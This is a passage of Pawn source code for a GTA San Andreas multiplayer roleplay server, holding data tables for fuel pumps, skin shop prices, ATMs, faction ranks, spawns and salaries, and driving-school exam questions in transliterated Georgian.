		{-42.6312,1412.7117,1085.1003,0.0000,0.0000,-91.2999}
	},
	{//38 = 8
		{93.9547,1332.5895,1089.0878,0.0000,0.0000,-88.4000},
		{93.6951,1332.5623,1089.0878,0.0000,0.0000,-85.3999},
		{93.3951,1332.5629,1089.0878,0.0000,0.0000,-87.3000}
	},
	{//39
		{256.4397,1244.1110,1084.8782,0.0000,0.0000,0.0000},
		{256.3773,1244.5097,1084.8884,0.0000,0.0000,0.0000},
		{256.3638,1244.9287,1084.8984,0.0000,0.0000,0.0000}
	},
	{//40 = 10
		{248.1866,306.3258,999.8886,0.0000,0.0000,-90.7999},
		{247.8925,306.3224,999.8785,0.0000,0.0000,-91.5000},
		{247.6226,306.3232,999.8887,0.0000,0.0000,-93.0999}
	},
	{//41
		{418.2810,2535.0168,10.6500,0.0000,0.0000,-85.2999},
		{417.9325,2535.0192,10.6500,0.0000,0.0000,-84.8999},
		{417.5417,2535.0476,10.6599,0.0000,0.0000,-90.3999}
	},
	{//42 = 17
		{223.5325,1247.4138,1082.8009,0.0000,0.0000,-85.6000},
		{223.7394,1247.4224,1082.8105,0.0000,0.0000,-87.5000},
		{223.9936,1247.4332,1082.8010,0.0000,0.0000,-92.3000}
	}
};
new gHintGunID[9] = {358,357,356,355,353,349,348,347,336};
new gHouseGunObject[MAX_HOUSE_COUNT][9];
new gHintStoreArea[HINTS_COUNT];
new gHouseImprovePrice[2] = {5000,20000};
new gHouseImproveName[2][64] = {"Автоматические двери","Шкаф для принадлежностей"};

new Float:gFuelPumps[FILLING_COUNT][4][6] = {
{
	{1000.0058,-937.4569,41.2972,0.0000,0.0000,95.2000},
	{1007.2109,-936.4054,41.2896,0.0000,0.0000,95.6999},
	{0.0,0.0,0.0,0.0,0.0,0.0},
	{0.0,0.0,0.0,0.0,0.0,0.0}
},
{
	{-97.02, -1173.29, 1.51,   0.00, 0.00, -21.24},
	{-92.40, -1162.24, 1.44,   0.00, 0.00, -21.78},
	{-85.27, -1164.43, 1.34,   0.00, 0.00, -19.80},
	{-90.49, -1176.42, 1.23,   0.00, 0.00, -23.10}
},
{
	{1941.88, -1767.68, 12.63,   0.00, 0.00, 0.00},
	{1941.78, -1771.02, 12.63,   0.00, 0.00, 0.00},
	{1941.83, -1774.56, 12.63,   0.00, 0.00, 0.00},
	{1941.83, -1777.99, 12.63,   0.00, 0.00, 0.00}
},
{
	{655.27, -558.63, 15.49,   0.00, 0.00, 0.00},
	{655.36, -560.65, 15.49,   0.00, 0.00, 0.00},
	{655.32, -569.42, 15.49,   0.00, 0.00, 0.00},
	{655.34, -571.29, 15.49,   0.00, 0.00, 0.00}
},
{
	{2196.8984, 2470.2500, 10.0558, 0.0000, 0.0000, 0.0000},
	{2196.8984, 2474.6875, 10.0558, 0.0000, 0.0000, 0.0000},
	{2207.6953, 2470.2500, 10.0558, 0.0000, 0.0000, 0.0000},
	{2207.6953, 2474.6875, 10.0558, 0.0000, 0.0000, 0.0000}
},
{
	{1602.0000, 2204.5000, 10.1125, 0.0000, 0.0000, 0.0000},
	{1596.1328, 2204.5000, 10.1125, 0.0000, 0.0000, 0.0000},
	{1590.3516, 2204.5000, 10.1125, 0.0000, 0.0000, 0.0000},
	{1602.0000, 2193.7109, 10.1125, 0.0000, 0.0000, 0.0000}
},
{
	{2153.3125, 2742.5234, 10.0734, 0.0000, 0.0000, 90.0000},
	{2147.5313, 2742.5234, 10.0734, 0.0000, 0.0000, 90.0000},
	{2141.6719, 2742.5234, 10.0734, 0.0000, 0.0000, 90.0000},
	{2153.3125, 2753.3203, 10.0734, 0.0000, 0.0000, 90.0000}
},
{
	{2634.6406, 1111.7500, 10.0500, 0.0000, 0.0000, 90.0000},
	{2639.8750, 1111.7500, 10.0500, 0.0000, 0.0000, 90.0000},
	{2645.2500, 1111.7500, 10.0500, 0.0000, 0.0000, 90.0000},
	{2634.6406, 1100.9453, 10.0500, 0.0000, 0.0000, 90.0000}
},
{
	{2120.8203, 914.7188, 10.0578, 0.0000, 0.0000, 90.0000},
	{2114.9063, 914.7188, 10.0578, 0.0000, 0.0000, 90.0000},
	{2109.0469, 914.7188, 10.0578, 0.0000, 0.0000, 90.0000},
	{2120.8203, 925.5078, 10.0578, 0.0000, 0.0000, 90.0000}
},
{
	{624.0469, 1677.6016, 4.9797, 0.0000, 0.0000, -55.9800},
	{620.5313, 1682.4609, 4.9797, 0.0000, 0.0000, -55.9800},
	{617.1250, 1687.4531, 4.9797, 0.0000, 0.0000, -55.9800},
	{613.7188, 1692.2656, 4.9797, 0.0000, 0.0000, -55.9800}
},
{
	{73.83558, 1219.65906, 18.23283,   0.00000, 0.00000, -13.80000},
	{67.99239, 1221.13452, 18.23283,   0.00000, 0.00000, -13.80000},
	{66.97035, 1217.18323, 18.23283,   0.00000, 0.00000, -13.80000},
	{72.72448, 1215.60425, 18.23283,   0.00000, 0.00000, -13.80000}
},
{
	{-1329.2031, 2669.2813, 48.2707, 0.0000, 0.0000, 83.2799},
	{-1328.5859, 2674.7109, 48.2707, 0.0000, 0.0000, 83.2799},
	{-1327.7969, 2680.1250, 48.2707, 0.0000, 0.0000, 83.2799},
	{-1327.0313, 2685.5938, 48.2707, 0.0000, 0.0000, 83.2799}
},
{
	{-1464.9375, 1860.5625, 30.6203, 0.0000, 0.0000, 95.9400},
	{-1477.6563, 1859.7344, 30.6203, 0.0000, 0.0000, 95.9400},
	{-1465.4766, 1868.2734, 30.6203, 0.0000, 0.0000, 95.9400},
	{-1477.8516, 1867.3125, 30.6203, 0.0000, 0.0000, 95.9400}
},
{
	{-2410.8047, 970.8516, 43.2844,   0.00000, 0.00000, 0.00000},
	{-2410.8047, 976.1875, 43.2844,   0.00000, 0.00000, 0.00000},
	{-2410.8047, 981.5234, 43.2844,   0.00000, 0.00000, 0.00000},
	{0.0,0.0,0.0,0.0,0.0,0.0}
},
{

	{-1679.3594, 403.0547, 5.1828, 0.0000, 0.0000, -45.4146},
	{-1675.2188, 407.1953, 5.1828, 0.0000, 0.0000, -45.4146},
	{-1669.9063, 412.5313, 5.1828, 0.0000, 0.0000, -45.4146},
	{-1665.5234, 416.9141, 5.1828, 0.0000, 0.0000, -45.4146}
},
{
	{-2026.61084, 155.89116, 28.13102,   0.00000, 0.00000, 0.00000},
	{-2026.62927, 157.73695, 28.13102,   0.00000, 0.00000, 0.00000},
	{0.0,0.0,0.0,0.0,0.0,0.0},
	{0.0,0.0,0.0,0.0,0.0,0.0}
},
{
	{-2246.7031, -2559.7109, 29.8625, 0.0000, 0.0000, -24.5000},
	{-2241.7188, -2562.2891, 29.8625, 0.0000, 0.0000, -24.5000},
	{0.0,0.0,0.0,0.0,0.0,0.0},
	{0.0,0.0,0.0,0.0,0.0,0.0}
},
{
	{-1610.6172, -2721.0000, 46.7297, 0.0000, 0.0000, 52.9200},
	{-1607.3047, -2716.6016, 46.7297, 0.0000, 0.0000, 52.9200},
	{-1603.9922, -2712.2031, 46.7297, 0.0000, 0.0000, 52.9200},
	{-1600.6719, -2707.8047, 46.7297, 0.0000, 0.0000, 52.9200}

}
};

//Скины
enum SKIN_DATA {
	skinID,
	skinPrice,
	skinClass, // 1 - эконом, 2 - средний, 3 - дорогой
	skinSex, // 1 - женский, 2 - мужской
	skinColor // 0 - белый, 1 - черный
}
#define SKIN_CLASS_ECONOM 1
#define SKIN_CLASS_MEDIUM 2
#define SKIN_CLASS_EXPENSIVE 3
#define SKIN_SEX_MALE 1
#define SKIN_SEX_FEMALE 2
#define SKIN_COLOR_WHITE 0
#define SKIN_COLOR_BLACK 1
new gSkins[114][SKIN_DATA] = {
	{31, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{38, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{39, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{131, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{198, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{201, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{207, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{193, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{226, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{237, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},//10
	{192, 30000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{214, 30000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{55, 50000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{56, 50000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{90, 50000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{151, 50000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{152, 50000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{169, 50000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{1, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{2, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},//20
	{3, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{8, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{32, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{72, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{94, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{128, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{133, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{23, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{33, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{34, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},//30
	{48, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{73, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{96, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{161, 40000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{202, 40000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{206, 40000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{4, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{5, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{6, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{7, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},//40
	{15, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{183, 25000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{14, 30000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{35, 30000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{36, 30000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{156, 30000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{21, 50000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{22, 50000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{24, 50000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{25, 50000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},//50
	{28, 60000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{66, 60000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{67, 60000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{176, 60000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{293, 60000, SKIN_CLASS_ECONOM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{9, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_BLACK},
	{10, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_BLACK},
	{13, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_BLACK},
	{69, 15000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_BLACK},
	{190, 30000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_BLACK},//60
	{195, 30000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_BLACK},
	{238, 30000, SKIN_CLASS_ECONOM, SKIN_SEX_FEMALE, SKIN_COLOR_BLACK},
	{57, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{59, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{100, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{170, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{181, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{185, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{241, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{242, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},//70
	{98, 95000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{112, 95000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{126, 95000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{247, 95000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{254, 95000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{269, 95000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{290, 95000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{117, 120000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{188, 120000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{240, 250000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_WHITE},//80
	{249, 100000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{250, 100000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{93, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{141, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{150, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{172, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{263, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{194, 100000, SKIN_CLASS_MEDIUM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{211, 100000, SKIN_CLASS_MEDIUM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{233, 100000, SKIN_CLASS_MEDIUM, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},//90
	{19, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{20, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{180, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{222, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{297, 90000, SKIN_CLASS_MEDIUM, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
	{11, 80000, SKIN_CLASS_MEDIUM, SKIN_SEX_FEMALE, SKIN_COLOR_BLACK},
	{12, 80000, SKIN_CLASS_MEDIUM, SKIN_SEX_FEMALE, SKIN_COLOR_BLACK},
	{46, 220000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{111, 220000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{171, 220000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_WHITE},//100
	{189, 220000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{223, 220000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{147, 250000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{187, 250000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{186, 250000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{208, 250000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{228, 250000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{294, 300000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_WHITE},
	{91, 250000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},
	{216, 250000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_FEMALE, SKIN_COLOR_WHITE},//110
    {17, 150000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
    {296, 300000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_MALE, SKIN_COLOR_BLACK},
    {219, 300000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_FEMALE, SKIN_COLOR_BLACK},
    {296, 300000, SKIN_CLASS_EXPENSIVE, SKIN_SEX_FEMALE, SKIN_COLOR_BLACK}
};

new Text: gSkinShopDraw[5];
new PlayerText: gSkinShopPriceDraw[MAX_PLAYERS];

//Банкоматы
new Float:gATMC[ATM_COUNT][6] = {
	{1762.19995117,-1934.30004883,13.50000000,0.00000000,0.00000000,270.00000000},
	{1414.69995117,-1773.09997559,-13.39999962,0.00000000,0.00000000,270.00000000},
	{567.50000000,-1305.69995117,17.10000038,0.00000000,0.00000000,180.00000000},
	{1092.50000000,-1803.59997559,13.50000000,0.00000000,0.00000000,270.00000000},
	{-2035.30004883,-102.19999695,35.09999847,0.00000000,0.00000000,270.00000000},
	{1664.19995117,2202.19995117,10.69999981,0.00000000,0.00000000,180.00000000},
	{2124.19995117,892.50000000,11.10000038,0.00000000,0.00000000,180.00000000},
	{-2353.30004883,1002.29998779,50.79999924,0.00000000,0.00000000,0.00000000}
};
new gATMArea[ATM_COUNT];


//Фракции
new gFractionName[FRACTION_COUNT][32] = {"Instruktori","Medik","The Ballas","Grove Street","Varios Los Aztecas","Los Santos Vagos","The Rifa","Department of Defence","Department of Interior","News","FBI","Yakuza","LCN","RM","Meria"};
new gFractionRankCount[FRACTION_COUNT] = {8,10,10,10,10,10,10,16,17,10,16,10,10,10,15};
new gFractionRankName[FRACTION_COUNT][18][32] = {
	{"[Rank1]","[Rank2]","[Rank3]","[Rank4]","[Rank5]","[Rank6]","[Rank7]","Direqtori","","","","","","","","","",""},//Инструкторы
	{"[Rank1]","[Rank2]","[Rank3]","[Rank4]","[Rank5]","[Rank6]","[Rank7]","[Rank8]","[Rank9]","Ministri","","","","","","","",""},//Медики
	{"","","","","","","","","","","","","","","","","",""},
	{"","","","","","","","","","","","","","","","","",""},
	{"","","","","","","","","","","","","","","","","",""},
	{"","","","","","","","","","","","","","","","","",""},
	{"","","","","","","","","","","","","","","","","",""},
	{"[Rank1]","[Rank2]","[Rank3]","[Rank4]","[Rank5]","[Rank6]","[Rank6]","[Rank7]","[Rank8]","[Rank9]","[Rank10]","[Rank11]","[Rank12]","[Rank13]","[Rank14]","[Rank15]","",""},
	{"[Rank1]","[Rank2]","[Rank3]","[Rank4]","[Rank5]","[Rank6]","[Rank6]","[Rank7]","[Rank8]","[Rank9]","[Rank10]","[Rank11]","[Rank12]","[Rank13]","[Rank1r]","[Rank15]","[Rank16]",""},
	{"[Rank1]","[Rank2]" "[Rank3]","[Rank4]","[Rank5]","[Rank6]","[Rank6]","[Rank7]","[Rank8]","[Rank9]","[Rank10]","","","","","","","",""},
	{"[Rank1]","[Rank2]","[Rank3]","[Rank4]","[Rank5]","[Rank6]","[Rank6]","[Rank7]","[Rank8]","[Rank9]","[Rank10]","[Rank11]","[Rank12]","[Rank13]","[Rank14]","[Rank15]","",""},
	{"[Rank1]","[Rank2]","[Rank3]","[Rank4]","[Rank5]","[Rank6]","[Rank6]","[Rank7]","[Rank8]","[Rank9]","","","","","","","",""},
    {"[Rank1]","[Rank2]","[Rank3]","[Rank4]","[Rank5]","[Rank6]","[Rank6]","[Rank7]","[Rank8]","[Rank9]","","","","","","","",""},
    {"[Rank1]","[Rank2]","[Rank3]","[Rank4]","[Rank5]","[Rank6]","[Rank6]","[Rank7]","[Rank8]","[Rank9]","[Rank10]","","","","","","",""},
    {"[Rank1]","[Rank3]","[Rank3]","[Rank4]","[Rank5]","[Rank6]","[Rank6]","[Rank7]","[Rank8]","[Rank9]","[Rank10]","[Rank11]","[Rank12]","[Rank13]","[Rank14]","","",""}
};
new gFractionSkin[FRACTION_COUNT][8] = {
	{11,98,171,172,189,240,0,0}, //Инструкторы
	{274,275,276,70,148,150,0,0}, //Медики LS
	{102,103,104,195,0,0,0,0}, //Ballas
	{105,106,107,195,269,270,271,0}, //Groove
	{193,114,115,116,292,0,0,0}, //Aztecaz
	{108,109,110,56,0,0,0,0}, //Vagos
	{173,174,175,226,273,0,0,0}, //Rifa
	{287,191,61,295,0,0,0,0}, //Defence
	{280,284,282,283,266,285,265,211}, //DOI
	{187,186,170,188,20,93,150,219}, //News
	{163,164,165,166,211,295,285,286}, // FBI
	{117,118,120,122,123,294,169,263}, //Yakuza
	{223,124,127,290,113,117,98,93}, //Mexico
	{46,111,112,126,125,272,233,43}, //Columbian
	{17,59,187,164,165,141,240,150} //Мэрия
};
new Float:gFractionSpawnC[FRACTION_COUNT][4] = {
	{1192.2136,-164.2941,922.4449,270.0}, //Инструкторы
	{143.4584,-227.8041,922.9600,90.0}, //Медики LS
	{1283.7483,-807.4769,1624.9728,270.0}, //Balls
	{1283.7483,-807.4769,1624.9728,270.0}, //Groove
	{1283.7483,-807.4769,1624.9728,270.0}, //Aztecaz
	{1283.7483,-807.4769,1624.9728,270.0}, //Vagos
	{1283.7483,-807.4769,1624.9728,270.0}, //Rifa
	{928.2743,-1733.3931,13.5469,266.7147}, //Мин. Обороны
	{1528.6564,-1672.1658,6.2188,269.3008}, //DOI
	{-10.2927,-88.0926,1248.4529,124.1560}, //Новости
	{-87.3708,-80.7007,1087.2069,124.1560}, // FBI
	{2573.0740,-1284.3938,1065.3672,137.2179},//Yakuza
	{2573.0740,-1284.3938,1065.3672,137.2179},//Mexico
	{2573.0740,-1284.3938,1065.3672,137.2179},//Columbian
	{-47.4226,-99.7972,1131.5659,137.2179}//Мэрия
};
new gFractionSpawnData[FRACTION_COUNT][2] = { // ИНТ + МИР
	{0,1},
	{1,1},
	{5,0},
	{5,1},
	{5,2},
	{5,3},
	{5,4},
	{0,0},
	{0,0},
	{1,1},
	{0,1},
    {2,2},
 	{2,3},
    {2,4},
    {0,1}
};
new gFractionColor[FRACTION_COUNT] = {0xFFE7BA11,0xF3622311,0xA020F011,0x00CD0011,0x00EEEE11,0xFFD70011,0x3A75C411,0xCDB38B11,0x0000ff11,0xcd107611,0x000cff00,0xff0000AA,0x9eff4fAA,0x6300f8AA,0xe6fb01AA};
new Float:gSubfractionSpawnC[SUBFRACTION_COUNT][3][4] = {
{
	{143.4584,-227.8041,922.9600,90.0},
	{143.4584,-227.8041,922.9600,90.0},
	{143.4584,-227.8041,922.9600,90.0}
},
{
	{403.1398,2547.4224,16.4698,270.0},
	{259.3429,1870.0015,8.7578,90.0},
	{0.0,0.0,0.0,0.0}
},
{
	{207.2495,-385.6293,1000.5192,188.9695},
	{207.2495,-385.6293,1000.5192,188.9695},
	{207.2495,-385.6293,1000.5192,188.9695}
}
};
new gSubfractionSpawnData[SUBFRACTION_COUNT][3][2] = {
{
	{1,1},
	{1,2},
	{1,3}
},
{
	{0,0},
	{0,0},
	{0,0}
},
{
	{1,1},
	{1,2},
	{1,3}
}
};
new gSubfractionName[SUBFRACTION_COUNT][3][24] = {
	{"Больница LS","Больница SF","Больница LV"},
	{"ВВС","ВСН",""},
	{"LSPD","SFPD","LVPD"}
};
new gFractionSalary[FRACTION_COUNT][18] = {
{2000,2800,3150,3600,4000,4350,4700,5000}, //???????????
{2500,3000,3500,4000,4500,5000,5500,6000,6500,8000}, //?????? LS
{1500,1500,1500,1500,1500,1500,1500,1500,1500,1500}, //GANG
{1500,1500,1500,1500,1500,1500,1500,1500,1500,1500}, //GANG
{1500,1500,1500,1500,1500,1500,1500,1500,1500,1500}, //GANG
{1500,1500,1500,1500,1500,1500,1500,1500,1500,1500}, //GANG
{1500,1500,1500,1500,1500,1500,1500,1500,1500,1500}, //GANG
{1500,1800,2000,2300,2600,2800,3000,3200,3500,4000,4200,4500,4700,5500,5700,6200}, //???. ???????
{1700,2000,2300,2600,2800,3000,3200,3500,4000,4200,4500,4700,5500,5700,6100,6500,7500}, //DOI
{1000,1200,1400,1600,1800,2000,2100,2200,2400,2600}, //???????
{2000,2800,3150,3600,4000,4350,4700,5000,5300,5500,5700,5900,6100,6400,6800,7800}, // FBI
{1000,1200,1400,1600,1880,2000,2240,2430,2600,3000}, //Yakuza
{1000,1200,1400,1600,1880,2000,2240,2430,2600,3000}, //Yakuza
{1000,1200,1400,1600,1880,2000,2240,2430,2600,3000}, //Yakuza
{2000,2800,3150,3600,4000,4350,4700,5000,5300,5500,5700,5900,6100,6400,7400} //?????
};


//Автошкола
new gExamQuestions[20][90] = {
"Ramdenia Dasashvebi Sichqare Dasaxlebul Punqtshi?", //1
"Ramdenia Dasashvebi Maximaluri Sichqare Dasaxlebuli Punqtis Moshorebit?", //2
"Romeli Dazianebebisas Aris Shesadzlebeli Manqanis Eqsplatacia?", //3
"Dasashvebia Tu Ara Manqanis Mobruneba Rkinigzis Gadasasvleltan?", //4
"Chartuli Spec Signalebis Danaxvis Shemtxvevashi Mdzgoli Valdebulia...?", //5
"Ra Shemtxvevashi Aris Gaswreba Marjvnidan Dasashvebi?", //6
"Ra Shemtxvevashia Dasashvebi Manqanis Eksplatacia?", //7
"Ra Shemtxvevebshia Dasashvebi Xmovani Signalis Gamoyeneba??", //8
"Ra Unda Gaaketo Pirvel Rigshi Avariis Moxvdenis Shemtxvevashi?", //9
"Romel Adgilebshi Aqvs Mdzgols Manqanis Gacherebis Ufleb?", //10
"Ra Unda Gaaketos Mdzgolma Gzajvaredinze Gasvlis Win?", //11
"Tqven Gaqvt Ufleba Msubuqi Avtomobilis Ekspluataciis Im Shemtxvevashi Tu... ?", //12
"Ra Shemtxvevashi Unda Gaiketo Gvedi?", //13
"Rodis Sheidzleba Shors Mxedveli Farebis Chartva?", //14
"Dasashvebia Tu Ara Gaswreba Ormagi Zolis Gadakvetis Shemtxvevashi?", //15
"Dasashvebia Tu Ara Spec Signalebis Dayeneba Sakutar Manqanaze?", //16
"Dasashvebia Tu Ara Abgoni Wvetili Xazis Shemtxvevashi?", //17
"Dasashvebia Tu Ara Ukan Svlit Modzraoba Magistralze?", //18
"Ra Dros Sheidzleba Avariuli Signalis Chartva?", //19
"Aucilebelia Tu Ara Gachereba Fexit Mosiaruleta Gadasasvlelis Win?" //20
};
